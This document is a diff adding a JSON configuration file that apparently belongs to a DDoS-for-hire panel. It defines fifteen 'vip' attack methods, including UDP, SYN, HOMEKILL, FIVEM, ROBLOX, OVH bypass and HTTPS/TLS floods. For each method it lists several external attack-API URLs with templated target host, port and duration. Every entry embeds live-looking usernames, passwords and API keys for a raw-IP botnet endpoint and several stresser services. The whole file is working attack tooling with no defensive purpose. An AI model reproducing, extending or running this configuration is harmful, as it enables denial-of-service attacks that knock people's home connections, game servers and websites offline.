@@ -1,0 +1,225 @@
+[
+  {
+    "name": "UDP",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP-BYPASS",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp-bypass"
+    ]
+  },
+  {
+    "name": "HOMEKILL",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=RAIL",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=PACKETHIVE&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=dns"
+    ]
+  },
+  {
+    "name": "UDP-GBPS",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=DNS",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=DNS",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=DNS",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIXAMP",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=mixampv2"
+    ]
+  },
+  {
+    "name": "TCP",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCPBYPASS",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP-BYPASS",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCPV2&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-kill"
+    ]
+  },
+  {
+    "name": "SSH",
+    "time": 120,
+    "description": "",
+    "permission": ["vip "],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=SSH",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCPBYPASS",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP-BYPASS",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=KILLALLV2&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVHTCP",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-kill"
+    ]
+  },
+  {
+    "name": "SYN",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=SYN",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCPBYPASS",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=SYNACK&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-syn"
+    ]
+  },
+  {
+    "name": "GAME",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=VSE",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HEADGAME&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=game"
+    ]
+  },
+  {
+    "name": "FIVEM",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=FIVEM",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=VSE",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HEADGAME&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=game"
+    ]
+  },
+  {
+    "name": "ROBLOX",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=ROBLOX",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=VSE",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HEADGAME&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=game"
+    ]
+  },
+  {
+    "name": "MC-DROP",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=MC",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCPBYPASS",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GAME",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=KILLALLV3&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-kill"
+    ]
+  },
+  {
+    "name": "OVH-TCP",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVHTCP",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH-BYPASS",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=tcp-kill"
+    ]
+  },
+  {
+    "name": "OVH-UDP",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVHUDP",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH-BYPASS",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp-bypass"
+    ]
+  },
+  {
+    "name": "PATH",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HANDSHAKE",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH-BYPASS",
+      "https://api.packethive.online/api.php?apikey=xforbreakfest&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=PATH&vip=1&totalservers=3",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=OVH",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=udp-path"
+    ]
+  },
+  {
+    "name": "HTTPS",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPS",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPS",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPS-STRONG",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPFLOOD",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=proxy"
+    ]
+  },
+  {
+    "name": "TLS",
+    "time": 120,
+    "description": "",
+    "permission": ["vip"],
+    "api": [
+      "http://185.225.75.43:1337/botnet/api?key=sins@gg&<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS",
+      "https://gorilla-spoofed-api.cloud/api/attack?username=sins&secret=sins@gg&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPSBYPASS",
+      "https://govslapped.homes/api/attack?username=nitrix&secret=nitrixkey15&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS",
+      "https://api.quickdown.pro/?token=gI2AyILIGwGkL8CEkUCk9q&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLSV2",
+      "https://api.plutosolutions.net/launch?username=thegtagod1&key=6Dnifrn5!&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPFLOOD",
+      "http://kuramaservices.xyz/api/p5158ea080879b8a7/attack?target=<<$host>>&port=<<$port>>&time=<<$time>>&method=proxy"
+    ]
+  }
+]
